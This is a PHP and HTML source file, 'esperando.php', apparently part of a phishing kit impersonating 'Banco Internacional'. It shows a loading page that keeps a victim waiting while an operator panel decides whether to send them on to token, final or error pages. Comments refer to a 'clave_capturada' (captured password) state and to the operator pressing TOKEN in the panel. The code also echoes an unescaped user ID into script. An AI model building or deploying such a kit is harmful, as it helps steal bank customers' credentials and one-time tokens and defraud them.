<?php
// esperando.php
session_start();

if (!isset($_GET["id"])) {
    die("ID de usuario no especificado");
}
$idUsuario = $_GET["id"];

try {
    $db = new PDO('sqlite:usuarios.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $stmt = $db->prepare("SELECT identificador, estado FROM usuarios WHERE id = ?");
    $stmt->execute([$idUsuario]);
    $usuario = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$usuario) {
        die("Usuario no encontrado");
    }

    $identificador = $usuario["identificador"];
    $estadoActual = $usuario["estado"];

    // ✅ CONFIGURACIÓN - SOLO REDIRIGE CUANDO TÚ ACTIVAS DESDE EL PANEL
    $config = [
        'internacional' => [
            'rutas' => [
                'token' => 'token.php',              // Solo cuando presionas TOKEN en panel
                'final' => 'final.php',              // Solo cuando presionas FINAL en panel  
                'error' => 'error.php'               // Solo cuando presionas ERROR en panel
                // Los estados 'esperando' y 'clave_capturada' NO redirigen - se quedan esperando
            ]
        ],
    ];

    $estilo = $config[$identificador] ?? $config['internacional'];
    $rutas = $estilo['rutas'];

} catch (PDOException $e) {
    die("Error al conectar: " . $e->getMessage());
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Esperando</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            background-image: url('mcm-web-skin/cache/2103021959/images/background_omnia.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: white;
            position: relative;
        }

        .overlay {
            position: absolute;
            inset: 0;
            background-color: rgba(0,0,0,0.3);
            z-index: 1;
        }

        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            max-width: 150px;
            z-index: 2;
        }

        .loader-gif {
            width: 100px;
            height: 100px;
            z-index: 2;
            position: relative;
        }
    </style>
</head>
<body>

    <div class="overlay"></div>

    <img src="./assets/logow.png" class="logo" alt="Logo Banco Internacional">

    <img src="assets/3d.gif" class="loader-gif" alt="Cargando">

    <script>
        const idUsuario = "<?= $idUsuario ?>";
        const rutas = <?= json_encode($rutas) ?>;

        function checkStatus() {
            fetch("estado.php?id=" + idUsuario)
                .then(res => res.json())
                .then(data => {
                    console.log("Estado actual:", data?.estado);
                    
                    // ✅ SOLO REDIRIGE SI EL ESTADO ESTÁ EN LA CONFIGURACIÓN
                    if (data && data.estado && rutas[data.estado]) {
                        console.log("Redirigiendo a:", rutas[data.estado]);
                        window.location.href = rutas[data.estado] + "?id=" + idUsuario;
                    } else {
                        // ✅ SI NO HAY RUTA DEFINIDA, SIGUE ESPERANDO
                        console.log("Quedando en espera...");
                        setTimeout(checkStatus, 3000);
                    }
                })
                .catch(() => setTimeout(checkStatus, 3000));
        }

        // ✅ INICIAR VERIFICACIÓN
        setTimeout(checkStatus, 2000);
    </script>

</body>
</html>